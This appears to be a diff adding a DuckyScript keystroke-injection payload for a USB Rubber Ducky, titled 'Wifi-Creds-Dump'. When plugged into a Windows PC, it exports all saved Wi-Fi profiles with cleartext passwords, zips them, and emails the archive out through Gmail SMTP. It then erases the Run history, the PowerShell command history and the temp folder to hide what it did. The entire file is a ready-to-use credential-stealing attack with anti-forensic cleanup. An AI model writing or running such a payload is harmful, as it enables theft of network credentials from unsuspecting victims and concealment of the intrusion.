@@ -1,0 +1,76 @@
+REM # Wifi-Creds-Dump
+REM # Created By: N0m4d1k
+REM # This takes approx 9 seconds to run.
+DELAY 250
+GUI r
+DELAY 250
+STRING cmd
+ENTER
+DELAY 250
+REM *****************
+REM *****************
+REM # Dumps Wifi Creds into Dir and Zips it.
+REM *****************
+STRING powershell
+ENTER
+DELAY 200
+STRING cd AppData\Local\Temp
+ENTER
+STRING mkdir A
+ENTER
+STRING cd A
+ENTER
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 150
+STRING cd ..
+ENTER
+STRING tar -a -c -f A.zip A
+ENTER
+REM *****************
+REM *****************
+REM # E-mails zip to yourself
+REM *****************
+DELAY 200
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'APPPASSWORD')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAIL'
+ENTER
+STRING $ReportEmail.To.Add('EMAIL')
+ENTER
+STRING $ReportEmail.Subject = 'Hello from the duck'
+ENTER
+STRING $ReportEmail.Body = 'QUACK'
+ENTER
+STRING $ReportEmail.Attachments.Add("AppData\Local\Temp\A.zip")
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 200
+REM *****************
+REM # Cleanup
+REM *****************
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING cd ..\..\
+ENTER
+STRING cd Roaming\Microsoft\Windows\PowerShell\PSReadLine
+ENTER
+STRING del ConsoleHost_history.txt
+ENTER
+STRING exit
+ENTER
+DELAY 150
+STRING del /q/f/s %TEMP%
+ENTER
+DELAY 250
+STRING exit
+ENTER
